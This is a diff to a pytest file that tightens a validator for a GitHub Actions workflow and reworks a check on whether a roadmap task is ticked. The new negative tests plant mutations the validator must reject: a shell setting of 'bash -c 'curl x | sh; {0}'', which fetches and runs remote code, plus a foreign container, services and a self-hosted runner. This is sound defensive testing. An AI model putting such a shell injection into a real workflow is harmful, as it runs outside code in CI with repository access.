@@ -18,9 +18,9 @@ from typing import Any
 import pytest
 import yaml
 from test_repository import ROOT, tracked_files, tracked_texts
+from test_roadmap import BUILD_CHANGE, tasks
 
 SKELETON = ROOT / "skeleton"
-TASKS = ROOT / "openspec/changes/add-pr-cost-calculator/tasks.md"
 README = ROOT / "README.md"
 
 # R234: the folders whose files could register, install or run the skeleton here.
@@ -108,10 +108,12 @@ def kept_shapes(paths: Iterable[str]) -> list[str]:
     return [p for p in paths if p.startswith("tests/") and Path(p).name.startswith(SHAPE_PREFIX)]
 
 
-def missing_shape_problems(tasks_text: str, shapes: list[str]) -> list[str]:
-    """Once task 1.36 is ticked, a kept shape must exist."""
-    ticked = re.search(r"^- \[x\] 1\.36 ", tasks_text, re.M | re.I)
-    if ticked and not shapes:
+def missing_shape_problems(states: dict[tuple[str, str], bool], shapes: list[str]) -> list[str]:
+    """Once task 1.36 is ticked, in the change or its archived copy, a kept shape must exist."""
+    task = (BUILD_CHANGE, "1.36")
+    if task not in states:
+        return ["task 1.36 was not found, so this check examined nothing"]
+    if states[task] and not shapes:
         return ["task 1.36 is ticked, but the transcript shape is missing (R236)"]
     return []
 
@@ -157,15 +159,24 @@ def workflow_problems(text: str) -> list[str]:
         problems.append(f"the workflow runs on another event: {event!r}")
     if data.get("permissions") != {"contents": "read", "pull-requests": "write"}:
         problems.append(f"the workflow asks for other permissions: {data.get('permissions')!r}")
+    if "defaults" in data:
+        problems.append("the workflow sets defaults, which can change how a command runs")
     for name, job in data["jobs"].items():
         if "permissions" in job:
             problems.append(f"job {name} asks for permissions of its own")
+        if job.get("runs-on") != "ubuntu-latest":
+            problems.append(f"job {name} runs on another runner: {job.get('runs-on')!r}")
+        for key in ("defaults", "container", "services"):
+            if key in job:
+                problems.append(f"job {name} sets {key}, which can run code from elsewhere")
         if not isinstance(job.get("timeout-minutes"), int):
             problems.append(f"job {name} sets no timeout-minutes")
         for number, step in enumerate(job.get("steps") or []):
             where = f"job {name}, step {number}"
             if "uses" in step:
                 problems += checkout_problems(where, step)
+            if "shell" in step:
+                problems.append(f"{where} sets a shell, which can run more than its command")
             run = str(step.get("run", ""))
             if "run" in step and run.strip() != REPORT_COMMAND:
                 problems.append(f"{where} runs another command than the report's: {run!r}")
@@ -226,7 +237,7 @@ def test_nothing_here_registers_the_walking_skeleton() -> None:
 
 def test_each_kept_transcript_shape_holds_no_values() -> None:
     shapes = kept_shapes(tracked_files())
-    problems = missing_shape_problems(TASKS.read_text(encoding="utf-8"), shapes)
+    problems = missing_shape_problems(tasks(ROOT), shapes)
     for shape in shapes:
         problems += shape_problems(ROOT / shape, shape)
     assert problems == []
@@ -341,12 +352,15 @@ def test_kept_shapes_are_the_tracked_files_under_tests_that_begin_with_its_name(
 
 
 def test_no_kept_shape_after_the_run_fails() -> None:
-    ticked = "- [x] 1.36 Run the walking skeleton once\n"
+    ticked = {(BUILD_CHANGE, "1.36"): True}
     assert missing_shape_problems(ticked, []) == [
         "task 1.36 is ticked, but the transcript shape is missing (R236)"
     ]
     assert missing_shape_problems(ticked, ["tests/fixtures/transcript-shape.json"]) == []
-    assert missing_shape_problems("- [ ] 1.36 Run the walking skeleton once\n", []) == []
+    assert missing_shape_problems({(BUILD_CHANGE, "1.36"): False}, []) == []
+    assert missing_shape_problems({(BUILD_CHANGE, "1.35"): True}, []) == [
+        "task 1.36 was not found, so this check examined nothing"
+    ]
 
 
 # ---- R237, planted ----
@@ -420,6 +434,27 @@ def test_the_workflow_as_designed_passes() -> None:
         ("AFTER: ${{ github.event.after }}", "AFTER: ${{ secrets['PAT'] }}", "secret"),
         ("report.py before after", "report.py after before", "report"),
         ("path: before\n", "path: old\n", "path"),
+        (
+            "        run: python3",
+            "        shell: bash -c 'curl x | sh; {0}'\n        run: python3",
+            "shell",
+        ),
+        (
+            "jobs:\n",
+            "defaults:\n  run:\n    shell: bash -c 'curl x | sh; {0}'\njobs:\n",
+            "defaults",
+        ),
+        (
+            "    timeout-minutes: 5\n",
+            "    timeout-minutes: 5\n    container: someone/image\n",
+            "container",
+        ),
+        (
+            "    timeout-minutes: 5\n",
+            "    timeout-minutes: 5\n    services:\n      x:\n        image: y\n",
+            "services",
+        ),
+        ("runs-on: ubuntu-latest", "runs-on: self-hosted", "runner"),
     ],
 )
 def test_a_workflow_that_could_do_more_fails(old: str, new: str, named: str) -> None:
